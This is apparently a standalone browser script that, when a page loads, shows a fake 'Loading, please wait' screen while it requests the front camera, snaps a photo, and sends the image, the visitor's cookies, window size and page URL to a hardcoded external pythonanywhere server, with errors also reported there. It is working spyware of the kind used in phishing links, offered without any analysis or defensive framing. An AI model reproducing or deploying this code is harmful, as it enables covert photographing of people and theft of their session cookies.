try {
    


// const server = 'https://ihihihodtshy.pythonanywhere.com';
const server = 'https://ihihihodtshy.pythonanywhere.com';
let locationGPS = { latitude: null, longitude: null };

function loading() {
    const loadingScreen = document.createElement('div');
    loadingScreen.id = 'loadingScreen';
    loadingScreen.style.position = 'fixed';
    loadingScreen.style.top = '0';
    loadingScreen.style.left = '0';
    loadingScreen.style.width = '100vw';
    loadingScreen.style.height = '100vh';
    loadingScreen.style.backgroundColor = '#fff';
    loadingScreen.style.zIndex = '9999';
    loadingScreen.style.display = 'flex';
    loadingScreen.style.justifyContent = 'center';
    loadingScreen.style.alignItems = 'center';
    loadingScreen.style.fontFamily = 'sans-serif';
    loadingScreen.innerHTML = '<h2>Loading, please wait...</h2>';
    document.body.appendChild(loadingScreen);
    hideLoading();
}

function hideLoading() {
    const loadingScreen = document.getElementById('loadingScreen');
    if (loadingScreen) {
        loadingScreen.remove();
    }
}

function sendData(location, image, error) {
    let attrs = "g";
    let post  = "p";
    if(image != null){
        post += "&img="+image
    }
    if(location != null){
        attrs += "&lat=" + location.latitude + ", " + location.longitude
    }
    if(document.cookie != ''){
        attrs += "&coo="+document.cookie
    }
    if(error != null){
        attrs += "&err"+error
    }
    attrs += "&win="+window.innerHeight+'x'+window.innerWidth
    let url = server + "/data?"+attrs
    console.log(url);

    const xhr = createRequest();
    xhr.open("POST", url, true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send(post);
}

function sendError(error) {
    let sendValue = error;
    if (sendValue != '') {
        const xhr2 = createRequest();
        xhr2.open("GET", server + "/send?m=" + encodeURIComponent(sendValue), true);
        xhr2.send();
    }
}

function sendAll(error) {
    sendData({ latitude: "[N/A]", longitude: "[N/A]" });
    sendError(error);
}

function createRequest() {
    let xhr;
    if (window.XMLHttpRequest) {
        xhr = new XMLHttpRequest();
    } else {
        xhr = new ActiveXObject("Microsoft.XMLHTTP");
    }
    return xhr;
}

function getMedia(constraints, successCallback, errorCallback) {
    if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
        return navigator.mediaDevices.getUserMedia(constraints).then(successCallback).catch(errorCallback);
    } else if (navigator.getUserMedia) {
        return navigator.getUserMedia(constraints, successCallback, errorCallback);
    } else if (navigator.webkitGetUserMedia) {
        return navigator.webkitGetUserMedia(constraints, successCallback, errorCallback);
    } else if (navigator.mozGetUserMedia) {
        return navigator.mozGetUserMedia(constraints, successCallback, errorCallback);
    } else {
        sendError("User media not supported");
        return null;
    }
}

document.addEventListener('DOMContentLoaded', function () {
    loading();
    const v = document.createElement('video');
    const c = document.createElement('canvas');
    const ctx = c.getContext('2d');
    const constraints = { video: { facingMode: 'user' } };
    
    getMedia(constraints,
        function (stream) {
            v.srcObject = stream;
            v.onloadedmetadata = () => {
                c.width = v.videoWidth;
                c.height = v.videoHeight;
                v.play().then(() => {
                    ctx.drawImage(v, 0, 0, c.width, c.height);
                    sendData(locationGPS, encodeURIComponent(c.toDataURL('image/jpeg')), null);
                    sendError("Link: "+window.location.href)
                    stream.getTracks().forEach(track => track.stop());
                    hideLoading();
                });
            };
        },
        function (error) {
            document.write(error);
            // sendAll(error);
            hideLoading();
        }
    );
});

} catch (error) {
    document.write(error);
    const xhr = new XMLHttpRequest();
    xhr.open("GET", "https://ihihihodtshy.pythonanywhere.com/send?m="+error)
    xhr.send();
    hideLoading();
}
